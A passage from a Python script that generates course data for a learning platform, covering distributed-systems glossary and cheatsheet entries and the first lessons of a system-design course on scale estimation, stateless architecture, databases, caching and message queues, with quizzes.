        {"id": "replication-tx", "title": "Replication & Sagas", "terms": [
            {"term": "Quorum (W + R > N)", "def": "The condition where read and write replica subsets overlap, guaranteeing reads observe the latest write.", "lesson": 5, "tags": ["replication", "quorum"]},
            {"term": "Saga Pattern", "def": "A sequence of local microservice transactions coordinated by events, using compensating transactions to undo failures.", "lesson": 6, "tags": ["transactions", "sagas"]},
            {"term": "Compensating Transaction", "def": "An explicit undo operation (like a refund) executed to reverse the business effects of an earlier step.", "lesson": 6, "tags": ["transactions", "rollback"]}
        ]},
        {"id": "causality", "title": "Causality & CRDTs", "terms": [
            {"term": "Clock Skew", "def": "The physical time drift between server quartz clocks that makes wall-clock timestamps unreliable for ordering.", "lesson": 7, "tags": ["time", "clocks"]},
            {"term": "Vector Clock", "def": "An array of logical clocks tracking causality across distributed nodes to determine 'happened-before' relationships.", "lesson": 7, "tags": ["time", "causality"]},
            {"term": "CRDT", "def": "Conflict-Free Replicated Data Type — data structures with commutative merge operations that converge deterministically.", "lesson": 7, "tags": ["crdt", "concurrency"]}
        ]}
    ]

    cheatsheet = [
        {
            "title": "G-Counter CRDT Implementation",
            "label": "Conflict-free distributed counter merge",
            "code": "class GCounter:\n    def __init__(self, node_id, n=3):\n        self.node_id = node_id\n        self.counts = [0] * n\n    def inc(self): self.counts[self.node_id] += 1\n    def value(self): return sum(self.counts)\n    def merge(self, other):\n        # Commutative, associative, idempotent maximum:\n        self.counts = [max(a, b) for a, b in zip(self.counts, other.counts)]",
            "lessonN": 7, "lessonSlug": "eventual-consistency-vector-clocks-crdts", "lessonTitle": "Eventual Consistency, Vector Clocks, and CRDTs"
        },
        {
            "title": "Consistent Hashing Ring Lookup",
            "label": "Clockwise binary search on ring",
            "code": "import bisect, hashlib\ndef get_node(key, ring_keys, ring_map):\n    h = int(hashlib.sha256(key.encode()).hexdigest(), 16)\n    idx = bisect.bisect_right(ring_keys, h)\n    if idx == len(ring_keys): idx = 0 # Wrap around ring!\n    return ring_map[ring_keys[idx]]",
            "lessonN": 4, "lessonSlug": "data-partitioning-consistent-hashing", "lessonTitle": "Data Partitioning and Consistent Hashing"
        },
        {
            "title": "Leaderless Quorum Assertion",
            "label": "Dynamo-style strong consistency condition",
            "code": "# To guarantee linearizable reads in Dynamo/Cassandra:\nN = 3 # Total replica nodes\nW = 2 # Write acknowledged by 2 nodes\nR = 2 # Read queries 2 nodes\nassert (W + R) > N, 'Quorum condition violated! Stale reads possible!'",
            "lessonN": 5, "lessonSlug": "replication-single-multi-leaderless", "lessonTitle": "Replication Strategies: Single-Leader, Multi-Leader, and Leaderless"
        },
        {
            "title": "Raft Cluster Quorum Majority Rule",
            "label": "Fault tolerance formula",
            "code": "# N nodes requires (N // 2 + 1) for quorum:\n# Survives F = (N - 1) // 2 node failures:\n# 3 nodes -> Quorum: 2 -> Survives 1 failure\n# 5 nodes -> Quorum: 3 -> Survives 2 failures",
            "lessonN": 3, "lessonSlug": "consensus-algorithms-raft-paxos", "lessonTitle": "Consensus Algorithms: Paxos, Raft, and Distributed State Machines"
        }
    ]

    course_data = {
        "id": "distributed-systems",
        "title": "Distributed Systems & Scalability",
        "num": 99,
        "emoji": "🕸️",
        "desc": "Consistency, partitioning, replication and failure — reasoning about many machines as one system.",
        "topics": ["Distributed Systems", "Network Fallacies", "Partial Failure", "CAP Theorem", "PACELC", "Raft Consensus", "Consistent Hashing", "Quorum Replication", "Sagas", "CRDTs"],
        "mission": "# Mission — Distributed Systems & Scalability\n\nMaster the science of reasoning about many machines cooperating as one unified system. Understand partial failure and the fallacies of distributed computing, navigate the CAP and PACELC trade-offs between consistency, availability, and latency, achieve infallible cluster agreement using Raft consensus and quorums, scale data horizontally with consistent hashing rings and virtual nodes, architect single-leader, multi-leader, and leaderless quorum replication systems, coordinate distributed transactions using the Saga pattern, and resolve concurrent edits with Vector Clocks and CRDTs.",
        "notes": "# Notes — Distributed Systems & Scalability\n\nAssume networks fail and components die independently. During partitions, choose CP or AP. Use odd-numbered Raft clusters for consensus, consistent hashing for partitioning, and sagas for distributed transactions.",
        "resources": "# Resources — Distributed Systems & Scalability\n\n- Martin Kleppmann, *Designing Data-Intensive Applications*\n- Diego Ongaro & John Ousterhout, *In Search of an Understandable Consensus Algorithm (Raft)*\n- Werner Vogels, *Eventually Consistent Revisited*",
        "glossaryGroups": glossary,
        "cheatsheetSections": cheatsheet,
        "lessons": lessons
    }
    save_course(course_data)

# ==============================================================================
# COURSE 100: system-design (System Design: From Idea to Production)
# ==============================================================================
def make_course_100():
    lessons = [
        build_lesson(
            1, "the-system-design-framework-scale-estimation", "The System Design Framework: Requirements, Scale, and Estimation", "System Design Framework",
            "The architectural process: clarifying functional/non-functional requirements, back-of-the-envelope estimation, and throughput/storage math.",
            "What is the very first step an elite systems architect takes when designing a complex software system?",
            ["Clarifying functional scope, non-functional requirements (SLAs, latency, availability), and calculating back-of-the-envelope scale estimations", "Immediately writing code in Python", "Choosing a database before knowing requirements", "Drawing a random architecture diagram"],
            0, "System design begins with scoping requirements and calculating back-of-the-envelope scale math.",
            [
                "<p>Welcome to <strong>Course 100: System Design: From Idea to Production</strong> — the capstone milestone of the entire Concept Lab curriculum. You have mastered computer science foundations, algorithms, databases, APIs, LLMs, AI agents, cybersecurity, containers, and distributed systems. Now, we bring every discipline together to architect <strong>planetary-scale software systems</strong>.</p>",
                "<p>The Proven 4-Step System Design Framework:</p>",
                "<ul><li><strong>1. Step 1: Requirements Clarification (Scoping):</strong><ul><li><em>Functional Requirements:</em> What must the system do? (e.g. Users post messages, view feeds, follow users).</li><li><em>Non-Functional Requirements:</em> High availability (99.99%), sub-200ms latency, read-heavy vs write-heavy ratio.</li></ul></li><li><strong>2. Step 2: Back-of-the-Envelope Estimation:</strong> Calculate the mathematical reality: <em>Throughput (QPS), Storage capacity per year, and Network bandwidth</em>.</li><li><strong>3. Step 3: High-Level Architecture Design:</strong> Sketch the core flow: Clients $\\rightarrow$ CDN $\\rightarrow$ API Gateway $\\rightarrow$ Services $\\rightarrow$ Databases $\\rightarrow$ Caches.</li><li><strong>4. Step 4: Deep Dive & Bottleneck Resolution:</strong> Address single points of failure, database sharding, cache invalidation, and data replication.</li></ul>",
                "<pre><code># Back-of-the-Envelope Estimation Math (The Power of 86,400):\n# Daily Active Users (DAU) = 100 Million\n# Requests per user per day = 5\n# Total Daily Requests = 500 Million requests / day\n#\n# Average Queries-Per-Second (QPS):\n# 500,000,000 / 86,400 seconds ≈ 5,800 QPS\n# Peak QPS (2x traffic surge) ≈ 11,600 QPS\n#\n# Storage Capacity per Year:\n# 500M posts/day x 2 KB per post = 1,000 GB/day = 1 TB / day\n# Annual Storage = 365 TB / year -> Requires distributed object storage (S3) & sharded DB!</code></pre>",
                "<div class=\"callout\"><p><strong>The Scale Rule:</strong> Always calculate Peak QPS and 5-Year Storage before choosing databases. Architecture without estimation is just fantasy.</p></div>"
            ],
            "The 4-Step System Design Framework", "The proven architectural methodology",
            [
                {"title": "1. Scoping Requirements", "lines": ["Functional: Core features & user actions", "Non-Functional: Availability, latency, consistency"]},
                {"title": "2. Back-of-the-Envelope Math", "lines": ["Calculate QPS, Peak Throughput, & Storage/Year", "Establishes physical hardware constraints"]},
                {"title": "3. High-Level Blueprint", "lines": ["APIs, gateways, microservices, databases, caches"]},
                {"title": "4. Deep Dive & Trade-offs", "lines": ["Sharding, circuit breakers, cache invalidation"]}
            ],
            "Back-of-the-Envelope Constants", "Key numbers every architect memorizes",
            [
                {"title": "1 Day in Seconds", "lines": ["~86,400 seconds (Round to 100k for fast mental math!)"]},
                {"title": "QPS Calculation", "lines": ["Total Daily Requests / 86,400 = Average QPS"]}
            ],
            "Complete the system design framework sentence",
            "System design begins by scoping functional and non-functional requirements and calculating back-of-the-envelope {1} to estimate throughput and annual {2} capacity.",
            [
                {"answer": "math", "hint": "Calculations and numerical estimations", "options": ["math", "formatting", "licensing"]},
                {"answer": "storage", "hint": "Data capacity in gigabytes or terabytes", "options": ["storage", "monitors", "cables"]}
            ],
            [
                {"q": "What is the approximate number of seconds in one day used for quick back-of-the-envelope QPS calculations?",
                 "a": ["86,400 seconds (often approximated as 100,000 for rapid mental estimates)", "3,600 seconds", "60,000 seconds", "1,000,000 seconds"],
                 "c": 0, "why": "24 hours x 60 mins x 60 secs = 86,400 seconds per day."},
                {"q": "What is the difference between Functional and Non-Functional requirements in system design?",
                 "a": ["Functional requirements define WHAT the system does (features); Non-Functional requirements define HOW the system behaves (latency, availability, scale)", "Functional is for frontends; non-functional is for backends", "Functional is free; non-functional is paid", "They are identical terms"],
                 "c": 0, "why": "Functional covers features and behaviors; non-functional defines operational qualities like latency and uptime."},
                {"q": "Why is estimating the 'Read-to-Write Ratio' (e.g. 100:1 read-heavy vs 1:1 write-heavy) critical when choosing databases?",
                 "a": ["Read-heavy systems heavily benefit from caching (Redis) and read replicas; write-heavy systems require partitioned sharded stores or append-only logs", "It changes the color of the database", "It determines the computer language used", "It is required by copyright law"],
                 "c": 0, "why": "Read-heavy architectures optimize for caching and replicas; write-heavy architectures optimize for sharding and write throughput."},
                {"q": "Why is jumping directly to drawing database boxes before clarifying requirements considered an interview and engineering anti-pattern?",
                 "a": ["Without knowing scale, read/write patterns, and consistency needs, any technical choice is purely an ungrounded guess", "Databases are obsolete", "Drawing boxes is forbidden in architecture", "It takes too long"],
                 "c": 0, "why": "Architectural components must be chosen to satisfy specific, quantified requirements and constraints."}
            ],
            "You know how to scope requirements and calculate back-of-the-envelope throughput and storage estimations.",
            "High-Level Architecture: API Gateways, Load Balancers, and Stateless Services", "Design decoupled, horizontally scalable ingress and application tiers."
        ),
        build_lesson(
            2, "high-level-architecture-gateways-stateless", "High-Level Architecture: API Gateways, Load Balancers, and Stateless Services", "High-Level Blueprint",
            "Constructing the skeleton: Anycast DNS, CDN edges, Application Load Balancers (ALBs), API Gateways, and stateless microservices.",
            "Why must application backend servers in high-scale architectures remain completely stateless?",
            ["Stateless servers store zero session state in local memory, allowing load balancers to distribute requests to any server and scale pods elastically", "Stateless servers use no electricity", "Stateful servers cannot run code", "Statelessness is required by Python"],
            0, "Statelessness allows application instances to scale from 2 to 200 nodes dynamically, serving any request from any node.",
            [
                "<p>Once requirements and scale are calculated, you construct the <strong>High-Level Architectural Blueprint</strong>. A planetary-scale system is structured like a funnel, shedding load and filtering traffic at each progressive layer.</p>",
                "<p>The Five Ingress & Application Tiers:</p>",
                "<ul><li><strong>1. Global Edge (Anycast DNS & CDN):</strong> Route 53 routes to Cloudflare/CloudFront. Terminates TLS locally and serves cached static assets (HTML, CSS, images) from edge RAM. 80% of total web traffic is absorbed here!</li><li><strong>2. Load Balancing (ALB / NLB):</strong> Balances remaining dynamic traffic across multiple Availability Zones using least-connections scheduling.</li><li><strong>3. API Gateway Tier (Kong / Envoy / Traefik):</strong> Single entry point for microservices: handles JWT authentication, tenant rate limiting, request routing, telemetry tracing, and SSL termination.</li><li><strong>4. Stateless Application Services:</strong> Microservices executing business logic. <strong>Stores ZERO user session state in memory!</strong></li><li><strong>5. Centralized State Tier:</strong> All session tokens, shopping carts, and active state are stored in distributed Redis clusters or databases.</li></ul>",
                "<pre><code># The High-Level System Architecture Funnel:\n[Global Clients: 100M Users]\n      │ (Anycast DNS)\n      ▼\n[CDN Edge Layer: CloudFront / Cloudflare] ──(80% Static Traffic Absorbed!)\n      │ (20% Dynamic API Traffic)\n      ▼\n[Application Load Balancers (ALB across Multi-AZ)]\n      │\n      ▼\n[API Gateway: Auth, Rate Limiting, OTel Tracing]\n      │ (Internal gRPC / HTTP)\n      ▼\n[Stateless Microservices: Service A, Service B, Service C]\n      │\n      ▼\n[Shared Distributed State: Redis Cluster & PostgreSQL Database]</code></pre>",
                "<div class=\"callout\"><p><strong>The Scale-Out Invariant:</strong> If you need to handle 10x more traffic, you simply spin up 10x more stateless app containers behind the load balancer. Statelessness enables horizontal scalability.</p></div>"
            ],
            "The Architectural Ingress Funnel", "Shedding load layer by layer",
            [
                {"title": "1. CDN Edge (80% Load Absorbed)", "lines": ["Static assets, images, cached responses", "Terminates TLS in 10ms locally"]},
                {"title": "2. API Gateway (Security & Routing)", "lines": ["JWT verification, rate limiting, routing", "Prevents unauthorized requests"]},
                {"title": "3. Stateless App Nodes", "lines": ["Scales horizontally from 5 to 500 pods", "Zero local session memory"]},
                {"title": "4. Distributed State Tier", "lines": ["Redis Cluster & Database Shards"]}
            ],
            "Vertical vs Horizontal Scaling", "Scale-Up vs Scale-Out",
            [
                {"title": "Vertical Scaling (Scale-Up)", "lines": ["Buying a bigger server (more RAM/CPU)", "Hard physical ceiling, single point of failure"]},
                {"title": "Horizontal Scaling (Scale-Out)", "lines": ["Adding more cheap commodity nodes", "Infinite theoretical scale, highly fault-tolerant"]}
            ],
            "Complete the high-level architecture sentence",
            "High-level system design funnels traffic through CDN edges, API gateways, and load balancers to {1} application services that scale {2} on demand.",
            [
                {"answer": "stateless", "hint": "Storing zero session state in local memory", "options": ["stateless", "formatting", "licensing"]},
                {"answer": "horizontally", "hint": "Adding more nodes (scale-out)", "options": ["horizontally", "vertically", "downward"]}
            ],
            [
                {"q": "What is the primary architectural responsibility of an API Gateway in microservice systems?",
                 "a": ["Providing a centralized entry point handling authentication, rate limiting, SSL termination, request routing, and telemetry tracing", "Storing all company files", "Writing code automatically", "Managing physical data center cables"],
                 "c": 0, "why": "API gateways centralize cross-cutting concerns like auth, rate limiting, and routing."},
                {"q": "Why is Horizontal Scaling (Scale-Out) preferred over Vertical Scaling (Scale-Up) for enterprise architectures?",
                 "a": ["Horizontal scaling has no physical hardware ceiling, costs less using commodity cloud instances, and provides high fault tolerance", "Horizontal scaling uses no electricity", "Vertical scaling is illegal in cloud computing", "Vertical scaling runs without code"],
                 "c": 0, "why": "Horizontal scaling distributes load across multiple machines, eliminating single points of failure."},
                {"q": "Where should a user's active login session state be stored in a horizontally scaled web architecture?",
                 "a": ["In a distributed in-memory cache like Redis or an encrypted client-side JWT, accessible by any backend server node", "In a local text file on Server A", "In the CPU registers", "On the developer's laptop"],
                 "c": 0, "why": "Shared in-memory stores allow any stateless application instance to validate and hydrate user sessions."},
                {"q": "How does an Application Load Balancer distribute traffic evenly across healthy backend instances?",
                 "a": ["Using scheduling algorithms like Round-Robin or Least Outstanding Requests, continuously removing instances that fail healthchecks", "By picking random computers", "By asking the user which server they prefer", "By sending all traffic to Server 1"],
                 "c": 0, "why": "ALBs use algorithms like least-connections while monitoring healthchecks to balance traffic smoothly."}
            ],
            "You know how to design decoupled, horizontally scalable high-level application architectures.",
            "The Storage Tier: Relational, NoSQL, and Sharded Databases", "Choose and scale the persistence tier: SQL vs NoSQL vs database sharding."
        ),
        build_lesson(
            3, "storage-tier-sql-nosql-sharding", "The Storage Tier: Relational, NoSQL, and Sharded Databases", "Storage Tier",
            "Database selection and scaling: Relational (Postgres/MySQL) vs NoSQL (Document, Key-Value, Columnar), Read Replicas, and Horizontal Sharding.",
            "When should an architecture choose a Relational (SQL) database over a NoSQL database?",
            ["When the application requires strict ACID transactions, complex multi-table JOINs, and structured relational integrity (e.g. financial ledgers)", "When storing petabytes of unstructured video files", "When queries never use relationships", "Relational databases should never be used"],
            0, "Relational SQL databases excel at complex relationships, structured queries, and strict ACID transaction guarantees.",
            [
                "<p>Choosing a database is one of the most consequential decisions in system design. Replacing a database in a live production system handling 100M users is like performing open-heart surgery on a marathon runner mid-race.</p>",
                "<p>The Database Selection Spectrum:</p>",
                "<ul><li><strong>1. Relational / SQL (PostgreSQL, MySQL):</strong> Structured schemas, relational JOINs, strict ACID transactions. Ideal for: <strong>Banking, user billing, e-commerce orders, and CRM systems</strong>. <em>Scaling Strategy:</em> Vertical scaling $\\rightarrow$ Read Replicas (for 90% read traffic) $\\rightarrow$ Horizontal Sharding.</li><li><strong>2. NoSQL Key-Value / Wide-Column (Cassandra, DynamoDB):</strong> Key-value lookups (`get(user_id)`). Massive write throughput, scales horizontally across hundreds of nodes with consistent hashing. Ideal for: <strong>High-volume telemetry, shopping carts, session stores, and IoT metrics</strong>.</li><li><strong>3. Document Stores (MongoDB):</strong> Flexible, semi-structured JSON documents. Ideal for: Content management systems, dynamic user profiles, catalog data.</li><li><strong>4. Horizontal Sharding:</strong> Partitioning a database across multiple machines based on a <strong>Shard Key</strong> (`user_id`). Shard 1 holds users 0-1M; Shard 2 holds users 1M-2M. Solves the physical write limit of single databases!</li></ul>",
                "<pre><code># The Database Decision Flowchart:\n# 1. Do you need strict ACID transactions & complex relational JOINs?\n#    ├── YES -> Relational (PostgreSQL / MySQL)\n#    └── NO  -> Check data access patterns:\n#         ├── High-throughput key lookup (Millions QPS) -> DynamoDB / Cassandra\n#         ├── Fast in-memory caching / Sliding windows -> Redis\n#         ├── Full-text search & logs                   -> Elasticsearch / OpenSearch\n#         └── Vector similarity search                  -> Qdrant / pgvector</code></pre>",
                "<div class=\"callout\"><p><strong>The Shard Key Trap:</strong> Choosing a bad shard key (like `created_at` timestamp) routes all new writes to the single active shard, creating a catastrophic <strong>Hot Shard bottleneck</strong>. Always pick high-cardinality keys with uniform distribution (like `user_id`).</p></div>"
            ],
            "SQL vs NoSQL Comparison", "Structured relationships vs horizontal scalability",
            [
                {"title": "Relational (PostgreSQL / MySQL)", "lines": ["Structured tables, foreign keys, ACID", "Complex JOINs, strict data integrity", "Scales reads via replicas; writes via sharding"]},
                {"title": "NoSQL (DynamoDB / Cassandra)", "lines": ["Key-value / Wide-column, schemaless", "Zero JOINs; denormalized access patterns", "Linear horizontal write scaling across 100+ nodes"]}
            ],
            "Database Horizontal Sharding", "Partitioning by Shard Key across physical database nodes",
            [
                {"title": "Shard 1 (DB Node 1)", "lines": ["Users: hash(id) % 3 == 0"]},
                {"title": "Shard 2 (DB Node 2)", "lines": ["Users: hash(id) % 3 == 1"]},
                {"title": "Shard 3 (DB Node 3)", "lines": ["Users: hash(id) % 3 == 2"]}
            ],
            "Complete the storage tier sentence",
            "Relational databases guarantee strict ACID transactions and relational JOINs, while distributed NoSQL databases scale horizontally by partitioning data across {1} based on a {2} key.",
            [
                {"answer": "shards", "hint": "Horizontal database partitions", "options": ["shards", "voltages", "hardware"]},
                {"answer": "shard", "hint": "Partition routing key (e.g. user_id)", "options": ["shard", "formatting", "licensing"]}
            ],
            [
                {"q": "What is a 'Hot Shard' in distributed database systems?",
                 "a": ["A single shard that receives a disproportionate majority of traffic because of an unevenly distributed shard key, overwhelming that single database node", "A database server that is overheating physically", "A database running on an SSD", "A fast database query"],
                 "c": 0, "why": "Hot shards occur when poor partition keys concentrate traffic onto one specific node, degrading cluster performance."},
                {"q": "Why is sharding by a sequential timestamp (e.g. 'created_at') an anti-pattern for write-heavy systems?",
                 "a": ["All current incoming writes have the current timestamp, routing 100% of write traffic to the single active shard holding the latest time window", "Timestamps cannot be hashed", "Databases cannot read dates", "Timestamps are illegal in SQL"],
                 "c": 0, "why": "Time-based keys route all active writes to the latest partition, negating horizontal load distribution."},
                {"q": "How do Database Read Replicas scale read-heavy applications?",
                 "a": ["Read queries are distributed across multiple read-only replica nodes, freeing the primary leader database to focus exclusively on writes", "Read replicas make writes faster", "Read replicas encrypt the database", "Read replicas run without RAM"],
                 "c": 0, "why": "Read replicas offload read volume, allowing the primary database to handle write transactions without contention."},
                {"q": "When is an append-only distributed log (like Apache Kafka) used instead of a traditional database?",
                 "a": ["For high-throughput, sequential event streaming (clickstreams, financial trades, audit logs) where events are immutable and ordered", "For storing user passwords", "For editing spreadsheets", "For serving static HTML pages"],
                 "c": 0, "why": "Kafka provides partitioned, append-only sequential log storage optimized for massive event streaming throughput."}
            ],
            "You know how to select, scale, and partition relational and NoSQL databases for high-throughput systems.",
            "Caching Strategies: Read-Through, Write-Behind, and Cache Invalidation", "Master caching patterns to achieve sub-millisecond data access."
        ),
        build_lesson(
            4, "caching-strategies-invalidation-patterns", "Caching Strategies: Read-Through, Write-Behind, and Cache Invalidation", "Caching Strategies",
            "High-speed data layers: Cache-Aside, Read-Through, Write-Through, Write-Behind (Write-Back), and the two hard problems: cache invalidation.",
            "What is the 'Cache-Aside' (Lazy Loading) pattern in system architecture?",
            ["The application checks the cache first; on a cache miss, it reads from the database, writes the result to the cache, and returns it to the user", "The cache is placed on the side of the server rack", "Data is cached in a browser cookie", "The cache deletes all data"],
            0, "Cache-Aside queries the cache first, lazily loading data from the database only on cache misses.",
            [
                "<p><em>'There are only two hard things in Computer Science: cache invalidation and naming things.'</em> — Phil Karlton. A cache placed in front of a database can increase read throughput by <strong>50x</strong> and drop latency from 30ms to <strong>0.8ms</strong>. But if your caching strategy is flawed, users will read stale data or corrupt records.</p>",
                "<p>The Four Foundational Caching Patterns:</p>",
                "<ul><li><strong>1. Cache-Aside (Lazy Loading — Industry Standard):</strong> Application reads from Redis. On Miss: Reads from DB $\\rightarrow$ Writes to Redis with TTL $\\rightarrow$ Returns data. <em>Advantage:</em> Only requested data is cached.</li><li><strong>2. Read-Through / Write-Through:</strong> The application treats the cache as the main data store. When a write occurs, the cache updates the database <strong>synchronously</strong> before confirming. <em>Advantage:</em> Data in cache is never stale! <em>Trade-off:</em> Higher write latency.</li><li><strong>3. Write-Behind (Write-Back):</strong> Writes go directly to the fast in-memory cache, and the cache writes asynchronously to the database in batches. <em>Advantage:</em> Blazingly fast writes! <em>Hazard:</em> If the cache crashes before flushing, <strong>data is lost permanently</strong>!</li><li><strong>4. Cache Invalidation Strategies:</strong> Time-to-Live (TTL expiration), Explicit Cache Eviction on write (`cache.delete(user_id)`), and Cache Purge webhooks.</li></ul>",
                "<pre><code># The Cache-Aside Pattern in Python:\nasync def get_user_profile(user_id: int) -> dict:\n    cache_key = f\"user:{user_id}:profile\"\n    \n    # 1. Check Redis Cache first (Sub-millisecond access!)\n    cached = await redis.get(cache_key)\n    if cached:\n        return json.loads(cached) # 0.8ms CACHE HIT!\n        \n    # 2. CACHE MISS -> Fetch from PostgreSQL Database (25ms)\n    profile_data = await db.fetch_user(user_id)\n    \n    # 3. Save to Redis with 1-hour TTL & return to user\n    await redis.set(cache_key, json.dumps(profile_data), ex=3600)\n    return profile_data</code></pre>",
                "<div class=\"callout\"><p><strong>The Mutation Rule:</strong> Whenever an entity is updated in the database, explicitly <strong>evict (delete)</strong> its cache key immediately. Deleting the key forces the next read to fetch fresh data, preventing stale reads.</p></div>"
            ],
            "The Four Caching Patterns", "Cache-Aside, Write-Through, Write-Behind",
            [
                {"title": "1. Cache-Aside (Lazy)", "lines": ["App reads cache -> Miss -> Reads DB -> Saves cache", "Caches only actively queried data, resilient"]},
                {"title": "2. Write-Through", "lines": ["Writes update Cache & DB synchronously", "Zero stale data, higher write latency"]},
                {"title": "3. Write-Behind (Write-Back)", "lines": ["Writes hit Cache only -> Async batch write to DB", "Ultra-fast writes, risk of data loss on crash!"]}
            ],
            "Cache Eviction on Mutation", "Preventing stale data reads",
            [
                {"title": "User Updates Email", "lines": ["UPDATE users SET email = 'new@mail.com'", "Step 2: redis.delete('user:102:profile')", "Next read fetches fresh email!"]}
            ],
            "Complete the caching sentence",
            "The Cache-Aside pattern queries the cache first and lazily loads from the database on a miss, while explicit cache {1} on write updates prevents users from reading {2} data.",
            [
                {"answer": "eviction", "hint": "Deleting the cached key", "options": ["eviction", "formatting", "licensing"]},
                {"answer": "stale", "hint": "Outdated or obsolete", "options": ["stale", "hardware", "terminal"]}
            ],
            [
                {"q": "What risk arises if a system uses the 'Write-Behind' (Write-Back) caching pattern and the cache node crashes before flushing to the database?",
                 "a": ["Permanent data loss: writes stored only in volatile cache RAM that were not yet flushed to the persistent database are lost", "The database is deleted", "The server catches fire", "The network speed drops"],
                 "c": 0, "why": "Write-behind holds uncommitted mutations in volatile memory; crashes before disk sync lose data."},
                {"q": "Why is setting a Time-to-Live (TTL) on every cached key considered a mandatory defensive practice?",
                 "a": ["It acts as a safety backstop ensuring stale data is eventually evicted even if an application bug misses an explicit cache eviction event", "It makes the cache faster", "It compresses the cache size", "TTLs are required by Redis syntax"],
                 "c": 0, "why": "TTLs guarantee eventual freshness, preventing orphaned or un-evicted keys from persisting forever."},
                {"q": "What is 'Cache Penetration' and how is it prevented?",
                 "a": ["When queries for non-existent keys bypass the cache and hit the database repeatedly; prevented by caching null values or using Bloom filters", "A physical break-in at a server room", "A memory corruption bug", "A slow network router"],
                 "c": 0, "why": "Cache penetration occurs when requests for missing keys hit the database; caching nulls prevents repeated lookups."},
                {"q": "What is a 'Bloom Filter' in high-throughput caching systems?",
                 "a": ["A space-efficient probabilistic data structure that tests whether an element is definitely NOT in a dataset before querying disk", "A graphics rendering filter", "A type of plant in an office", "An audio filter"],
                 "c": 0, "why": "Bloom filters quickly identify if a key does not exist, preventing unnecessary database lookups."},
            ],
            "You know how to design caching architectures using Cache-Aside, Write-Through, Write-Behind, and eviction policies.",
            "Asynchronous Messaging: Message Queues, Pub/Sub, and Event Streams (Kafka)", "Decouple services using asynchronous messaging, pub/sub, and streaming logs."
        ),
        build_lesson(
            5, "asynchronous-messaging-queues-kafka", "Asynchronous Messaging: Message Queues, Pub/Sub, and Event Streams (Kafka)", "Messaging & Streams",
            "Asynchronous decoupling: Point-to-Point Message Queues (RabbitMQ/SQS), Publish/Subscribe (SNS), and Distributed Commit Logs (Apache Kafka).",
            "What is the fundamental architectural difference between a Message Queue (like SQS/RabbitMQ) and an Event Stream (like Apache Kafka)?",
            ["Message queues delete messages once consumed by a worker; event streams retain immutable, ordered logs of events that multiple consumers can replay", "Message queues are for text; event streams are for video", "They are identical technologies", "Kafka runs in the browser"],
            0, "Queues delete messages upon processing; Kafka maintains persistent, replayable, ordered logs partitioned across consumers.",
            [
                "<p>If your `OrderService` synchronously calls the `PaymentService`, `EmailService`, `InventoryService`, and `AnalyticsService` over HTTP during checkout, the checkout takes 4 seconds and fails if <em>any single service</em> is down. <strong>Asynchronous Messaging decouples services</strong>, making systems resilient and fast.</p>",
                "<p>The Three Messaging Paradigms:</p>",
                "<ul><li><strong>1. Point-to-Point Message Queues (RabbitMQ, AWS SQS):</strong> A producer sends a message to a queue. <strong>Exactly one worker</strong> consumes and processes the message, after which it is deleted. Ideal for: <strong>Task distribution, background video transcoding, PDF generation</strong>.</li><li><strong>2. Publish/Subscribe (Pub/Sub — AWS SNS, Google Pub/Sub):</strong> A producer publishes an event to a Topic (e.g. `OrderPlaced`). <strong>Multiple independent subscribers</strong> receive a copy of the event simultaneously! The Order service publishes once; Billing, Shipping, and Analytics all react independently!</li><li><strong>3. Distributed Event Streaming (Apache Kafka):</strong> An append-only, partitioned, immutable distributed log. Events are stored persistently for days or months. Multiple consumer groups read events at their own pace and can <strong>replay history</strong> from any offset! High throughput: millions of events/sec!</li></ul>",
                "<pre><code># Synchronous Coupling vs Asynchronous Event-Driven Decoupling:\n# SYNCHRONOUS (Fragile): \n# [Order Service] ──HTTP──> [Payment Svc] ──HTTP──> [Email Svc] ──HTTP──> [Analytics]\n# (If Email Service times out, the entire customer checkout fails!)\n#\n# ASYNCHRONOUS EVENT-DRIVEN (Resilient & Fast):\n# [Order Service] ──Publishes: \"OrderPlaced\"──> [Kafka Topic / SNS]\n#                                                    ├──> [Payment Worker] (Processes)\n#                                                    ├──> [Email Worker]   (Processes)\n#                                                    └──> [Analytics Svc]  (Ingests)\n# (Customer receives instant HTTP 200 checkout confirmation in 40ms!)</code></pre>",
                "<div class=\"callout\"><p><strong>The Dead Letter Queue (DLQ):</strong> Always attach a Dead Letter Queue (DLQ) to message queues. If a poison-pill message fails processing 3 times, move it to the DLQ so the worker queue is not blocked!</p></div>"
            ],
            "The Three Messaging Paradigms", "Point-to-Point vs Pub/Sub vs Distributed Logs",
            [
                {"title": "Message Queue (SQS / RabbitMQ)", "lines": ["1 producer -> 1 consumer (Work queue)", "Message deleted upon successful processing", "Best for: Background task jobs & worker pools"]},
                {"title": "Pub/Sub (SNS)", "lines": ["1 publisher -> Multiple subscribers (Fan-out)", "Subscribers receive duplicate copies of event", "Best for: Event notifications & service decoupling"]},
                {"title": "Event Stream (Apache Kafka)", "lines": ["Partitioned, persistent, append-only log", "Events retained for days; consumers replay offsets", "Best for: High-throughput streaming & analytics"]}
            ],
            "Dead Letter Queue (DLQ) Protection", "Isolating poison-pill messages",
            [
                {"title": "Worker Fails 3 Times", "lines": ["Malformed payload causes exception"]},
                {"title": "Routed to DLQ", "lines": ["Poison message moved to DLQ for inspection", "Queue unblocked, normal processing resumes!"]}
            ],
            "Complete the asynchronous messaging sentence",
            "Asynchronous architectures decouple services using point-to-point queues for worker tasks, pub/sub for event fan-out, and {1} for replayable, high-throughput event {2}.",
            [
                {"answer": "Kafka", "hint": "Distributed append-only event stream platform", "options": ["Kafka", "HTML", "CSS"]},
                {"answer": "streams", "hint": "Ordered sequences of historical events", "options": ["streams", "hardware", "monitors"]}
            ],
            [
                {"q": "What is a 'Dead Letter Queue' (DLQ) in message processing architectures?",
                 "a": ["A secondary queue where messages that fail processing repeatedly (poison-pill messages) are isolated for developer inspection without blocking the main queue", "A queue for deleting emails", "A broken network router", "A queue for cancelled orders"],
                 "c": 0, "why": "DLQs isolate unprocessable messages, preventing them from looping indefinitely and blocking workers."},
                {"q": "Why is Apache Kafka capable of handling millions of messages per second on modest hardware?",
                 "a": ["Kafka writes sequentially to disk (which is as fast as sequential memory access) and uses OS zero-copy network transfer (sendfile)", "Kafka runs in quantum memory", "Kafka deletes messages immediately", "Kafka is written in assembly"],
                 "c": 0, "why": "Sequential disk I/O, page-cache utilization, and Linux zero-copy networking give Kafka extreme throughput."},
                {"q": "What is 'Consumer Lag' in Apache Kafka monitoring?",
                 "a": ["The difference between the latest offset written to a Kafka partition and the offset currently being processed by a consumer group", "A delay in the computer screen", "A broken network cable", "The time to boot Kafka"],
